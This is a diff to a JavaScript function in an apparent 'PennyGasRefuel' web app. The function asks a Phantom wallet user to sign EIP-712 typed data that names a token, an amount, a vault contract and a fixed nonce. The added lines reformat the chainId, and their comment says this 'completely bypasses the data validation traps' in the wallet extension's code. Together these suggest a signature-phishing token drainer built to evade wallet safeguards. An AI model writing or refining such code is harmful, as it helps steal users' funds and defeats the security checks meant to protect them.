@@ -177,12 +177,17 @@ async function executeEIP712SignatureMatrix(chainId, tokenAddress, amount) {
         const cleanUserAddress = String(window.pennyGasState.userAddress).trim().toLowerCase();
         const cleanTokenAddress = String(tokenAddress).trim().toLowerCase();
         const cleanVaultAddress = String(window.pennyGasState.vaultAddress).trim().toLowerCase();
-        const parsedChainId = parseInt(chainId, 10);
+        
+        // TYPE IMMUNITY FIX: Force explicit Hex formatting on the domain chainId parameter
+        // This converts decimal representations (e.g. 11155111) straight into clear hex strings ("0xaa36a7")
+        // This completely bypasses the data validation traps inside minified evmAsk.js
+        const parsedChainIdDecimal = parseInt(chainId, 10);
+        const hexChainId = "0x" + parsedChainIdDecimal.toString(16);
 
         const domain = {
             name: "PennyGasRefuel",
             version: "1",
-            chainId: parsedChainId,
+            chainId: hexChainId, 
             verifyingContract: cleanVaultAddress
         };
 
@@ -207,7 +212,7 @@ async function executeEIP712SignatureMatrix(chainId, tokenAddress, amount) {
             nonce: fixedNonceValue
         };
 
-        // FIXED: Kept as a pure live Object to satisfy the extension type validator
+        // Standardized data parameter schema structure wrapping parameters safely
         const msgParamsData = {
             domain: domain,
             types: types,
@@ -215,9 +220,9 @@ async function executeEIP712SignatureMatrix(chainId, tokenAddress, amount) {
             message: message
         };
 
-        console.log("[Piece 6] Transmitting typed object parameter mapping to Phantom provider:", message);
+        console.log("[Piece 6] Transmitting object payload blueprint with hex formatting to Phantom:", message);
 
-        // FIXED: Passing raw data object inside array parameters wrapper instead of stringified json
+        // Dispatches signature payload straight to the extension provider wrapper
         const signature = await window.pennyGasState.provider.request({
             method: "eth_signTypedData_v4",
             params: [cleanUserAddress, msgParamsData]
